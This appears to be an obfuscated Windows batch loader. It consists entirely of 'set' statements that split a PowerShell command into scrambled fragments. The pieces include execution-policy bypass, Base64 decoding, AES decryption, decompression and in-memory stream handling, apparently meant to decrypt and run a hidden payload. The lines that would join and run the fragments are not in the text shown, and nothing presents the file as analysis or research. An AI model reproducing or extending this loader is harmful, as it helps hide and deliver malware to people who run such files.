@echo off
set "cNooNBtwgM=y "
set "VHsZVMkWgF=32"
set "sAzjpELkKX=nd"
set "NFvhwqSPfI= /"
set "NwWORYpdrO=0\"
set "BBlxaxkXxG=ll"
set "nqlZrlDZoY=we"
set "SdmffnLLUi=rs"
set "zVLRyUMrzF= C"
set "eQmHYNSBzj=Wi"
set "wtybKwozuT=ll"
set "WcmuTXUKFx=ow"
set "yZdedIJeSL=s\"
set "vqPtWfuGLI=.e"
set "fRpRSUoQFV=in"
set "ckSpnndmjm=Sy"
set "WkPzMMElmo=1."
set "KIAMgimiRc=\v"
set "oLPgYAydbn=he"
set "jHMRWGkdZP=po"
set "xurlOmAYcn=we"
set "UziRWfzigc=xe"
set "QGKjflGCay=ws"
set "UHBtbmugkc=\W"
set "ApjwEVpZWi=py"
set "QIhCqNUFci=do"
set "SiQdSoyXDg=he"
set "AxbjSJuMaH=co"
set "OCvyRhxpVR=:\"
set "XqkdBdrBga=Po"
set "vmFXUbDROa=st"
set "rOeclyhgLH=rS"
set "ShWcKswufG=em"
set "qrsFjrxgOZ= %~dp0"
set "axnXvtMCHO=cd"
set "bTibgSBApI=.Cre"
set "UDuzrXAjsX=y.Cr"
set "dTqiaWsEMw=wG);"
set "LmuODugqZb=g = "
set "tRRtWDKgVm=ptog"
set "LrraRVHDnQ=$uON"
set "ForFMrligK=eMVs"
set "tTHCUmFxwk=AvrO"
set "volMldySmK=l5E7"
set "UEUKvTgerp=Disp"
set "mxpTdKkPHa=saBm"
set "xYvdyJVnsX=oryS"
set "hsUmumMAIV='txe"
set "ptMNVsEMre=ew-O"
set "kxiwfoSAqb=wOj "
set "gppklgFnxc=PxEW"
set "OEdVJDsAcd=KP ="
set "TiAvQPrkNy=oin "
set "OBfWDmhAfu=em.I"
set "azGyCmZXTL=rofi"
set "CIIzmwfSLa=..-1"
set "fDBSIOBdLZ=IyrK"
set "aXMcBflscR=.Dis"
set "UcJUBGWqNr=($xd"
set "NAFxlWrsVk= if "
set "qDSqupwPoW=Disp"
set "uOZhnkIiFo=nirt"
set "IHiulsjsZa=NA ="
set "DJAZymzyoW=NA);"
set "ZobCVUehlo=py.D"
set "kTeyykZujA=();$"
set "TkGsNJxoUs=]::N"
set "wFiaFjigiw=yTo("
set "ttADmOhYaa=y = "
set "EpdzOWPKgF=iaqB"
set "bTgpvcaQdV=in $"
set "XCdQipjwrg=rtS4"
set "sAhvXaTSRd=3); "
set "iCwrjvGgMV=:: '"
set "KEniGqYncR=null"
set "aGHiUFvDTd=ss -"
set "BWpxwrqjfr=s75K"
set "qzDuskhWZh=-ep "
set "PYzANQybrS=t Sy"
set "HYtKauqGdp=tem."
set "NKbFxXWzMl=RmAx"
set "aSAFdjeWlK=] -j"
set "wrConJcLMo=f.En"
set "qOyXgjKXYR=).Sp"
set "oQfCCPrpYu=pose"
set "NZEMJMIbzF=Syst"
set "TILuEUNQrJ=PqoW"
set "avFtWHSpAm=Bmor"
set "IfsZwzuGBb=ypto"
set "gtaHjeaDQy=form"
set "jOtqDmQgBx=L4Yi"
set "VsgZlDyDFK= = ["
set "ojQCERgYAp=am;$"
set "XOouQoTuja=tion"
set "PxSMbuaziW=nr, "
set "bYxrKWFLtK=rt]:"
set "vEmbnhdzdZ=y.Ci"
set "RQavSmbSUQ=ert]"
set "HjudbgeCyv=$bia"
set "dgdYlswSsU=);$E"
set "IevmkLCYSv=ose("
set "HdDsaUVxJc=n ''"
set "EPTlWTyEVe=S46e"
set "WoFbopySTB===')"
set "EiqBEKLZEB=bypa"
set "flIxNLraaJ=gjYA"
set "OfaSfXbHdw=;$dc"
set "kHEmCQOYYn=vEn."
set "rHkojgToDq=New-"
set "ecAHwBXJTA=16] "
set "SSKitznagK=.Dis"
set "yFqplWWsbc=.Key"
set "tzTejNdHoy=dcYd"
set "hxzdLIbHIA=pher"
set "RwWVigkaop=yste"
set "XOvEqFcaGV=::('"
set "UgoKEVtdLh=wG ="
set "umHIwoPeaw=ode]"
set "sExoopifbm=bjec"
set "iXjXOSpOSX=;$HA"
set "oRSengcerj=;$XL"
set "IYNwHRUyRf=PqoW"
set "YGSzIPWxka=TllA"
set "NUmAAuXzbW='0Pg"
set "evidjvWOVj=('%*'"
set "xxWhyPKtgN=ring"
set "IEajIoJsOj=  $u"
set "dxtbdwxTzU=e]::"
set "ayvChFXdGM=Star"
set "RIHrztQPQc='')("
set "VIiMfIVLOJ=ptor"
set "FwRXaIDwnY=yste"
set "vcSRZwevPu=En.T"
set "DncgoSQzYZ=gnir"
set "wCUVzzkIPA='[-1"
set "rxEMOQOgNi=tS46"
set "wWTRZGVLpu=onve"
set "YZPJVzbirk=le  "
set "yaQQzBWmfs=comm"
set "MTKzPfzFGF=ress"
set "gWhvyapHuR=esaB"
set "VMOdOYLosl=th('"
set "XWegnWzPkN=ddin"
set "jLxftUmVhx=]::("
set "yzZPvtpVTU=7;$b"
set "olwTdccNjk= = $"
set "HMtWMtKoYD=iaqB"
set "fcXMgPInel=and "
set "itRyPvMuJe=$yCm"
set "fGHbUeiKky=ONwG"
set "gCaFVABjFX=Syst"
set "EvOPvJxVJB=e = "
set "PxHqmUSNQG=($xd"
set "GtRcuVBLLX=)))"
set "WEQxaxjesx=vert"
set "tFxwHpIBFV=; };"
set "bxUVdFbdPa=.Cry"
set "dPeKRMeiBt=ispo"
set "kvLXZmZqeA=orF'"
set "JmwwFPEQgP=]::C"
set "KiXzkAumxs=yste"
set "FHqkcOKwyO=[Env"
set "CJoGBdAwDE=ONwG"
set "UZUsDhherk=stem"
set "WRQhWhqObp=Mode"
set "pwwekMiAsy=Comp"
set "ZbLAYzCdcR=iaqB"
set "lMKzrPSNZC=mory"
set "JzsFgATcEB=ke($"
set "QyfbdJXiIu=iaqB"
set "OwAIoQpozt=-Obj"
set "SxlLAieIzB=);$H"
set "DucgCNjDOW=.Len"
set "mjuYUQOVXD=fore"
set "WmLYqwIzqM=nage"
set "SSjQXVsjVi=PTtG"
set "JjehyrTmZf=urit"
set "rsjrtcQGFN=yCmp"
set "jgEzMnrMRL=.Con"
set "qmYpalFiTV=[]] "
set "BXQZxEwgiq= '')"
set "mzeJqoQpTl=);$y"
set "OcEQjKSuzN=$Iyr"
set "uVGoNoIYeD=;$oX"
set "jyjeZkzTeb=pose"
set "MXmaDVIHhe= New"
set "VoEVzyynUr=[IO."
set "NupyvNskdG=oXNn"
set "umunAFacBT=rans"
set "xcZtuatgfC=tryP"
set "ZTHoBeqqiW=ionM"
set "fUWyKkwVFM=uONw"
set "zTbFdHYLtc=rity"
set "hRBdTEuEuy=YxVw"
set "AREVgXyfdD=.-16"
set "SWWFaSjJEy=em.C"
set "ElmPDzjiaQ=-nop"
set "vSZivMWUAc=sion"
set "sCVSugppsM=$Eyy"
set "gILfezfRsv=m.IO"
set "ImzCJEwdpX=gth)"
set "whlbxojrul=File"
set "WhyIpwwZGP=stem"
set "vHZECVInqQ=ct S"
set "QpETYMbahw=.Sec"
set "cVSFmtvqSh=O.Me"
set "TdHMAYgJfK=m.IO"
set "JbSzZzQHpE=pStr"
set "NOOreaOPWD=wOj."
set "ioOUEmnEsV=Stre"
set "fwLILlvLZx=G = "
set "XyoTGsGWFd=.Cry"
set "sdMfMGWhpg=vEn "
set "QGSUZeqnpy= '')"
set "vwhdJPfNNG=k; }"
set "KtQIuucVYr=iaqB"
set "ryovLRoftn= = N"
set "omnXLNtQkW=qB.I"
set "qoxaVyrqWv=$XLv"
set "oMxdJcAyBm=);$b"
set "JUbcAxinbr=$Eyy"
set "kRdfGYOWRX= = $"
set "MmmOIkJeqK=.Mod"
set "DiegYNLAHk=6] -"
set "UNqjuCBzng=brea"
set "vqpKzNeAIQ=zuZI"
set "kIemTijQXC=ose("
set "OZPibganeY=m(, "
set "xLvIQkuSJo=.Mem"
set "rjkRFnwqVN=$Eyy"
set "aUupnhvjYn=Cmpy"
set "eLcrupdwVS=::De"
